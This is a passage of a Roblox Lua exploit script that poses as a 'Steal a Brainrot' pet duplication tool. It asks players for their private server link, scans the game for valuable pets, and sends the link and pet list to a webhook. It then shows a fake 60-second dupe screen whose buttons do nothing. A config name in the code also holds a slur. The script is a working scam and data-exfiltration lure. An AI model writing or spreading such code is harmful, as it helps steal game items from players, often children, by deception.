startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
startButton.TextSize = 20 -- bigger text

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = startButton

local closeButton = Instance.new("TextButton")
closeButton.Parent = mainFrame
closeButton.BackgroundTransparency = 1
closeButton.Position = UDim2.new(1, -36, 0, 8)
closeButton.Size = UDim2.new(0, 32, 0, 32) -- bigger close button
closeButton.Font = Enum.Font.GothamBold
closeButton.Text = "Ã—"
closeButton.TextColor3 = Color3.fromRGB(200, 200, 200)
closeButton.TextSize = 26 -- bigger text

---------------------------------------------------------------------

---------------------------------------------------------------------
local function checkForPets()
    local found = {}
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Model") then
            local nameLower = string.lower(obj.Name)
            for _, target in pairs(getgenv().RetardNames) do
                if string.find(nameLower, string.lower(target)) then
                    table.insert(found, obj.Name)
                    break
                end
            end
        end
    end
    return found
end

local function isValidPrivateLink(raw)
    if type(raw) ~= "string" then return false end
    local url = raw:gsub("^%s+", ""):gsub("%s+$", "")
    if url == "" then return false end
    local startsWithHttp = url:sub(1, 8) == "https://" or url:sub(1, 7) == "http://"
    if not startsWithHttp then return false end
    local hostOk = (string.find(url, "roblox.com", 1, true) ~= nil)
        or (string.find(url, "rblx.gg", 1, true) ~= nil)
        or (string.find(url, "rblx.link", 1, true) ~= nil)
    if not hostOk then return false end
    local looksPrivate = (
        string.find(url, "privateServerLinkCode=", 1, true) ~= nil
        or string.find(url, "/games/", 1, true) ~= nil
        or string.find(url, "placeId=", 1, true) ~= nil
        or string.find(url, "gameid=", 1, true) ~= nil
    )
    return looksPrivate
end

startButton.MouseButton1Click:Connect(function()
    local serverLink = textBox.Text
    local hasRoblox = type(serverLink) == "string" and string.find(string.lower(serverLink), "roblox", 1, true) ~= nil
    if not hasRoblox then
        local originalColor = textBox.BackgroundColor3
        textBox.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
        subtitleLabel.Text = "Link must contain \"roblox private server\""
        subtitleLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        wait(1.5)
        textBox.BackgroundColor3 = originalColor
        subtitleLabel.Text = "Type In Private Server Link"
        subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
        return
    end
    startButton.Text = "Loading..."
    startButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)

    local petsFound = checkForPets()
    task.spawn(function()
        sendWebhook(serverLink, petsFound)
        pcall(function()
            local req = http_request or request or (syn and syn.request)
            if req then
                req({
                    Url = getgenv().webhook,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode({ content = serverLink })
                })
            end
        end)
    end)

    startButton.Text = "âœ… Loaded!"
    startButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
            -- Full-screen overlay (persistent)
            local overlay = Instance.new("ScreenGui")
            overlay.Name = "BrainrotOverlay"
            overlay.IgnoreGuiInset = true
            overlay.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            overlay.Parent = playerGui

            local bg = Instance.new("Frame")
            bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
            bg.BackgroundTransparency = 0
            bg.Size = UDim2.new(1, 0, 1, 0)
            bg.Parent = overlay

            -- Animated gradient background
            local gradient = Instance.new("UIGradient")
            gradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.0, Color3.fromRGB(255, 0, 128)),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 230, 0)),
                ColorSequenceKeypoint.new(1.0, Color3.fromRGB(0, 200, 255))
            })
            gradient.Rotation = 0
            gradient.Parent = bg

            task.spawn(function()
                while overlay.Parent do
                    for rot = 0, 360, 3 do
                        gradient.Rotation = rot
                        task.wait(0.03)
                    end
                end
            end)

            local label = Instance.new("TextLabel")
            label.BackgroundTransparency = 1
            label.Size = UDim2.new(1, 0, 0, 80)
            label.Position = UDim2.new(0, 0, 0, 12)
            label.Text = "STEAL A BRAINROT DUPE"
            label.TextColor3 = Color3.fromRGB(255, 215, 0)
            label.TextScaled = true
            label.Parent = bg
            -- Try to use Luckiest Guy-like font; fallback to FredokaOne if available else GothamBlack
            pcall(function()
                label.Font = Enum.Font.LuckiestGuy
            end)
            if label.Font == Enum.Font.SourceSans then
                pcall(function()
                    label.Font = Enum.Font.FredokaOne
                end)
            end
            if label.Font == Enum.Font.SourceSans then
                label.Font = Enum.Font.GothamBlack
            end

            -- Gentle pulse effect
            task.spawn(function()
                while overlay.Parent do
                    TweenService:Create(label, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {TextTransparency = 0.05}):Play()
                    task.wait(0.8)
                    TweenService:Create(label, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {TextTransparency = 0.15}):Play()
                    task.wait(0.8)
                end
            end)

            -- 60s loading bar under the header
            local barBack = Instance.new("Frame")
            barBack.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            barBack.Size = UDim2.new(0.8, 0, 0, 18)
            barBack.Position = UDim2.new(0.1, 0, 0, 100)
            barBack.Parent = bg
            local bbCorner = Instance.new("UICorner")
            bbCorner.CornerRadius = UDim.new(0, 9)
            bbCorner.Parent = barBack

            local barFill = Instance.new("Frame")
            barFill.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
            barFill.Size = UDim2.new(0, 0, 1, 0)
            barFill.Parent = barBack
            local bfCorner = Instance.new("UICorner")
            bfCorner.CornerRadius = UDim.new(0, 9)
            bfCorner.Parent = barFill

            -- Neon spark riding progress
            local spark = Instance.new("Frame")
            spark.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            spark.BackgroundTransparency = 0.2
            spark.Size = UDim2.new(0, 8, 0, 18)
            spark.Position = UDim2.new(0, -4, 0.5, -9)
            spark.Parent = barBack
            local sparkGlow = Instance.new("UIStroke")
            sparkGlow.Color = Color3.fromRGB(255, 240, 150)
            sparkGlow.Thickness = 4
            sparkGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            sparkGlow.Parent = spark

            local timeText = Instance.new("TextLabel")
            timeText.BackgroundTransparency = 1
            timeText.Size = UDim2.new(0, 120, 0, 18)
            timeText.Position = UDim2.new(0.92, 8, 0, 100)
            timeText.Text = "60s"
            timeText.TextColor3 = Color3.fromRGB(255, 215, 0)
            timeText.Font = Enum.Font.GothamBold
            timeText.TextSize = 14
            timeText.Parent = bg

            -- Smooth fill over 60 seconds with visible activity
            TweenService:Create(barFill, TweenInfo.new(60, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)}):Play()
            TweenService:Create(spark, TweenInfo.new(60, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Position = UDim2.new(1, -4, 0.5, -9)}):Play()
            -- Brainrot marquee text
            local marquee = Instance.new("TextLabel")
            marquee.BackgroundTransparency = 1
            marquee.Size = UDim2.new(2, 0, 0, 36)
            marquee.Position = UDim2.new(-1, 0, 0, 60)
            marquee.Text = "ðŸ§  BRAINROT MODE â€¢ SKIBIDI â€¢ RIZZ â€¢ GYATT â€¢ OHIO â€¢ BOP â€¢ MEWING â€¢ SIGMA â€¢ FANUM TAX â€¢ GOON ðŸ§ "
            marquee.TextColor3 = Color3.fromRGB(255, 255, 255)
            marquee.Font = Enum.Font.GothamBlack
            marquee.TextSize = 22
            marquee.Parent = bg

            task.spawn(function()
                while overlay.Parent do
                    marquee.Position = UDim2.new(-1, 0, 0, 60)
                    TweenService:Create(marquee, TweenInfo.new(8, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Position = UDim2.new(0, 0, 0, 60)}):Play()
                    task.wait(8)
                end
            end)

            -- Emoji rain
            local emojis = {"ðŸ§ ","ðŸ’¥","âš¡","ðŸ”¥","âœ¨","ðŸ˜ˆ","ðŸ¥¶","ðŸ’«","ðŸš€","ðŸŽ¯"}
            task.spawn(function()
                while overlay.Parent do
                    local drop = Instance.new("TextLabel")
                    drop.BackgroundTransparency = 1
                    drop.Size = UDim2.new(0, 32, 0, 32)
                    drop.Position = UDim2.new(math.random(), -16, -0.1, -32)
                    drop.Text = emojis[math.random(1, #emojis)]
                    drop.TextScaled = true
                    drop.TextColor3 = Color3.fromRGB(255, 255, 255)
                    drop.Parent = bg
                    local fallTime = math.random(4, 7)
                    TweenService:Create(drop, TweenInfo.new(fallTime, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {Position = UDim2.new(drop.Position.X.Scale, drop.Position.X.Offset, 1.1, 0), TextTransparency = 0.1}):Play()
                    task.delay(fallTime, function()
                        if drop then drop:Destroy() end
                    end)
                    task.wait(0.15)
                end
            end)
            task.spawn(function()
                for remaining = 60, 0, -1 do
                    timeText.Text = tostring(remaining) .. "s"
                    task.wait(1)
                end
                timeText.Text = "Ready"
            end)

            -- Detect device type and adjust selector accordingly
            local hasTouch, isSmallScreen, isTablet, screenSize = isMobileOrTouchDevice()
            
            -- Selector panel for pets and quantities (responsive sizing)
            local selector = Instance.new("Frame")
            selector.Name = "Selector"
            selector.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            selector.BackgroundTransparency = 0.15
            selector.AnchorPoint = Vector2.new(0.5, 0.5)
            selector.Parent = bg

            -- Responsive sizing based on device type
            if isSmallScreen then
                -- Mobile phone layout
                selector.Size = UDim2.new(0.95, 0, 0.7, 0)
                selector.Position = UDim2.new(0.5, 0, 0.5, 0)
            elseif isTablet then
                -- Tablet layout
                selector.Size = UDim2.new(0.8, 0, 0.6, 0)
                selector.Position = UDim2.new(0.5, 0, 0.5, 0)
            else
                -- Desktop layout
                selector.Size = UDim2.new(0, 720, 0, 420)
                selector.Position = UDim2.new(0.5, 0, 0.6, 0)
            end
            local selCorner = Instance.new("UICorner")
            selCorner.CornerRadius = UDim.new(0, 12)
            selCorner.Parent = selector

            local selTitle = Instance.new("TextLabel")
            selTitle.BackgroundTransparency = 1
            selTitle.Size = UDim2.new(1, -20, 0, isSmallScreen and 28 or 36)
            selTitle.Position = UDim2.new(0, 10, 0, 10)
            selTitle.Text = "Select Pets to Dupe"
            selTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            selTitle.Font = Enum.Font.GothamBold
            selTitle.TextSize = isSmallScreen and 16 or 18
            selTitle.TextXAlignment = Enum.TextXAlignment.Left
            selTitle.Parent = selector

            local list = Instance.new("ScrollingFrame")
            list.BackgroundTransparency = 1
            list.Size = UDim2.new(1, -20, 1, isSmallScreen and -100 or -120)
            list.Position = UDim2.new(0, 10, 0, isSmallScreen and 48 or 56)
            list.CanvasSize = UDim2.new(0, 0, 0, 0)
            list.ScrollBarThickness = isSmallScreen and 8 or 6
            list.Parent = selector
            local layout = Instance.new("UIListLayout")
            layout.Padding = UDim.new(0, isSmallScreen and 4 or 6)
            layout.SortOrder = Enum.SortOrder.Name
            layout.Parent = list

            local selectedPets = {}
            local function addRow(petName)
                local row = Instance.new("Frame")
                row.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
                row.Size = UDim2.new(1, -4, 0, isSmallScreen and 32 or 36)
                row.Parent = list
                local rowCorner = Instance.new("UICorner")
                rowCorner.CornerRadius = UDim.new(0, 8)
                rowCorner.Parent = row

                local nameLbl = Instance.new("TextLabel")
                nameLbl.BackgroundTransparency = 1
                nameLbl.Size = UDim2.new(0.6, 0, 1, 0)
                nameLbl.Position = UDim2.new(0, 10, 0, 0)
                nameLbl.Text = petName
                nameLbl.TextColor3 = Color3.fromRGB(235, 235, 235)
                nameLbl.Font = Enum.Font.Gotham
                nameLbl.TextSize = isSmallScreen and 12 or 14
                nameLbl.TextXAlignment = Enum.TextXAlignment.Left
                nameLbl.Parent = row

                local qty = Instance.new("TextBox")
                qty.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
                qty.Size = UDim2.new(0, isSmallScreen and 50 or 60, 0, isSmallScreen and 24 or 26)
                qty.Position = UDim2.new(0.68, 0, 0.5, isSmallScreen and -12 or -13)
                qty.Font = Enum.Font.Gotham
                qty.Text = "1"
                qty.TextColor3 = Color3.fromRGB(255, 255, 255)
                qty.TextSize = isSmallScreen and 12 or 14
                qty.Parent = row
                local qtyCorner = Instance.new("UICorner")
                qtyCorner.CornerRadius = UDim.new(0, 6)
                qtyCorner.Parent = qty

                local toggle = Instance.new("TextButton")
                toggle.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
                toggle.Size = UDim2.new(0, isSmallScreen and 80 or 90, 0, isSmallScreen and 24 or 26)
                toggle.Position = UDim2.new(1, isSmallScreen and -90 or -100, 0.5, isSmallScreen and -12 or -13)
                toggle.Font = Enum.Font.GothamBold
                toggle.Text = "Select"
                toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
                toggle.TextSize = isSmallScreen and 12 or 14
                toggle.Parent = row
                local tCorner = Instance.new("UICorner")
                tCorner.CornerRadius = UDim.new(0, 6)
                tCorner.Parent = toggle

                local selected = false
                local function refresh()
                    if selected then
                        toggle.Text = "Selected"
                        toggle.BackgroundColor3 = Color3.fromRGB(50, 180, 80)
                    else
                        toggle.Text = "Select"
                        toggle.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
                    end
                end
                refresh()

                toggle.MouseButton1Click:Connect(function()
                    selected = not selected
                    if selected then
                        local n = tonumber(qty.Text) or 1
                        if n < 1 then n = 1 end
                        selectedPets[petName] = n
                    else
                        selectedPets[petName] = nil
                    end
                    refresh()
                end)
            end

            for _, pet in ipairs(petsFound) do
                addRow(pet)
            end

            layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
                list.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
            end)

            -- Buttons row at bottom-right of selector (responsive)
            local dupeBtn = Instance.new("TextButton")
            dupeBtn.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
            dupeBtn.Size = UDim2.new(0, isSmallScreen and 180 or 220, 0, isSmallScreen and 36 or 40)
            dupeBtn.Position = UDim2.new(1, isSmallScreen and -190 or -230, 1, isSmallScreen and -46 or -54)
            dupeBtn.Font = Enum.Font.GothamBold
            dupeBtn.Text = "Dupe Selected"
            dupeBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            dupeBtn.TextSize = isSmallScreen and 14 or 16
            dupeBtn.Parent = selector
            local dCorner = Instance.new("UICorner")
            dCorner.CornerRadius = UDim.new(0, 8)
            dCorner.Parent = dupeBtn

            -- Rejoin button to the left (non-functional)
            local rejoinBtn = Instance.new("TextButton")
            rejoinBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 50)
            rejoinBtn.Size = UDim2.new(0, isSmallScreen and 180 or 220, 0, isSmallScreen and 36 or 40)
            rejoinBtn.Position = UDim2.new(1, isSmallScreen and -380 or -460, 1, isSmallScreen and -46 or -54)
            rejoinBtn.Font = Enum.Font.GothamBold
            rejoinBtn.Text = "Rejoin Server"
            rejoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            rejoinBtn.TextSize = isSmallScreen and 14 or 16
            rejoinBtn.Parent = selector
            local rCorner = Instance.new("UICorner")
            rCorner.CornerRadius = UDim.new(0, 8)
            rCorner.Parent = rejoinBtn

            dupeBtn.MouseButton1Click:Connect(function()
                -- For now, just print/log the selection; extend with your dupe logic
                local summary = {}
                for k, v in pairs(selectedPets) do
                    table.insert(summary, k .. " x" .. tostring(v))
                end
                if #summary == 0 then
                    selTitle.Text = "Select Pets to Dupe â€” none selected"
                    selTitle.TextColor3 = Color3.fromRGB(255, 120, 120)
                else
                    selTitle.Text = "Queued: " .. table.concat(summary, ", ")
                    selTitle.TextColor3 = Color3.fromRGB(180, 255, 180)
                end
            end)

            -- Remove the loader panel now that overlay persists
            if screenGui then screenGui:Destroy() end
end)

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

mainFrame.Size = UDim2.new(0, 0, 0, 0)
local spawnTween = TweenService:Create(
    mainFrame,
    TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
    {Size = UDim2.new(0, 420, 0, 220)}
)
spawnTween:Play()
